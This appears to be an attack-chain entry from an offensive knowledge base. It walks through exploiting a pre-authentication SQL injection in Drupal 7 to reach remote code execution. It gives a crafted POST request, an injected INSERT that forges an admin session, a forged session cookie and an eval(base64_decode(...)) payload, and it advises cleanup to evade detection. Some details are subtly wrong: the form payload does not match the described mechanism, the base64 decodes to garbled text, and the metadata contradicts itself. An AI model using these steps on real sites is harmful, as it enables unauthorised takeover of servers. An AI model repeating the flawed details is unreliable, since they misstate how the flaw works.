---
id: drupal7-sqli-rce-chain-001
tags:
  - sql-injection
  - drupal
  - rce
  - pre-auth
  - php
  - web
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Analyze-Drupal-Database-Query-Preparation-for-IN-Statements]]'
  - '[[procedures/Craft-SQL-Injection-Payload-Using-Associative-Arrays]]'
  - '[[procedures/Exploit-SQL-Injection-to-Insert-Arbitrary-Database-Data]]'
  - '[[procedures/Achieve-RCE-via-Manipulated-Admin-Session]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T03:46:20.036Z'
description: >-
  A multi-stage attack exploiting a SQL injection vulnerability in Drupal 7's
  database API to achieve unauthenticated remote code execution via session
  manipulation.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# Drupal 7 Pre-Authentication SQL Injection to Remote Code Execution

Multi-stage attack chain demonstrating a complete attack workflow exploiting a vulnerability in Drupal 7 versions prior to 7.32.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Analyze Query Preparation] --> B[Craft Injection Payload]
    B --> C[Insert Malicious Data]
    C --> D[Execute RCE via Session]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (manual analysis and payload crafting via web requests)

### Target Environment

- Drupal 7.x prior to 7.32
- PHP with PDO-enabled database (e.g., MySQL)
- Web server exposing Drupal site

### Initial Access Requirements

- Network access to the unauthenticated Drupal endpoint (e.g., user registration or search forms using db_query with IN clauses)
- No credentials required (pre-authentication)
- Prior access: None, public-facing application

## Detailed Attack Procedures

### Step 1: Analyze Drupal Database Query Preparation
procedure: [[procedures/Analyze-Drupal-Database-Query-Preparation-for-IN-Statements]]

**Objective**: Identify flaws in Drupal's expandArguments function for handling IN clauses with associative arrays.

**Instructions**: Review Drupal's database API source code, focusing on the expandArguments function in includes/database/database.inc. Examine how it iterates over arrays assuming integer or no keys, but mishandles string keys like 'test) -- ' which create invalid placeholders.

For example, inspect a query like:

```php
$names = array('user1', 'user2');
db_query('SELECT * FROM {users} WHERE name IN (:names)', array(':names' => $names));
```

This expands correctly, but test with associative arrays to reveal the injection point.

**Expected Output**: Understanding that non-integer keys lead to malformed SQL like 'IN (:name_test) -- , :name_test )'.

**Success Indicators**:
- Confirmed mishandling of associative arrays in expandArguments
- Identified vulnerable db_query calls in pre-auth endpoints

### Step 2: Craft SQL Injection Payload
procedure: [[procedures/Craft-SQL-Injection-Payload-Using-Associative-Arrays]]

**Objective**: Create a payload that injects arbitrary SQL by leveraging string keys with SQL comments to bypass prepared statements.

**Instructions**: Construct an associative array for the IN clause parameter, using a key like 'test) -- ' to terminate the clause prematurely. Target a vulnerable endpoint, such as a search or registration form that uses db_query with IN.

Example payload in a POST request to a vulnerable form:

```http
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

q=inject&names[]=test) -- &names[user2]=dummy
```

In PHP terms, this mimics:

```php
$params = array(':name' => array('test) -- ' => 'user1', 'test' => 'user2'));
db_query('SELECT * FROM {users} WHERE name IN (:name)', $params);
```

Resulting in injectable SQL: 'SELECT * FROM users WHERE name IN (:name_test) -- , :name_test )' where the comment bypasses the rest.

**Expected Output**: Server processes the query with injected SQL, allowing arbitrary code insertion.

**Success Indicators**:
- Query executes without syntax errors but with injection
- Database logs show malformed placeholders

### Step 3: Exploit SQL Injection to Insert Data
procedure: [[procedures/Exploit-SQL-Injection-to-Insert-Arbitrary-Database-Data]]

**Objective**: Use the injection to insert malicious data into the sessions table, creating an admin session.

**Instructions**: Extend the payload to inject an INSERT statement targeting the sessions table. Assign UserID 1 (admin) to a new session SID via a pre-auth endpoint.

Example injected SQL payload:

```sql
); INSERT INTO sessions (sid, ssid, uid, hostname, timestamp, session) VALUES ('malicious_sid', '0', 1, 'attacker_ip', UNIX_TIMESTAMP(), 'admin_session_data') --
```

Deliver via the crafted array in a web request to the vulnerable form, ensuring the injection closes the original query and appends the INSERT.

**Expected Output**: New admin session record in the database, verifiable by querying the sessions table.

**Success Indicators**:
- Admin session inserted successfully
- No authentication errors on subsequent requests using the SID

### Step 4: Achieve Remote Code Execution
procedure: [[procedures/Achieve-RCE-via-Manipulated-Admin-Session]]

**Objective**: Impersonate the admin user with the forged session to trigger PHP code execution through Drupal's callback features.

**Instructions**: Use the malicious SID in a cookie to access admin-only functionality. Trigger RCE by exploiting Drupal's menu callbacks or form handlers that allow PHP execution, such as injecting code into a module callback.

Set cookie:

```http
Cookie: SESSmalicious_sid=admin_session_data
```

Then request an admin endpoint that executes user-supplied callbacks, e.g., a form with PHP eval via injected data. A second request can clean up the session to avoid traces.

Example RCE payload in callback:

```php
eval(base64_decode('cGhwaW5mby8vdmFyL2xvZy9hcGNoZS5sb2c='));
```

**Expected Output**: Arbitrary PHP code runs on the server, e.g., writing to logs or executing system commands.

**Success Indicators**:
- Code executes (e.g., file written or command output)
- Session cleanup prevents detection

## Attack Chain Summary

### Key Achievements

1. Pre-auth SQL injection via flawed array handling in Drupal's DB API
2. Arbitrary database manipulation to forge admin sessions
3. Unauthenticated RCE through session impersonation and PHP callbacks
4. Stealthy execution with cleanup to evade detection

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
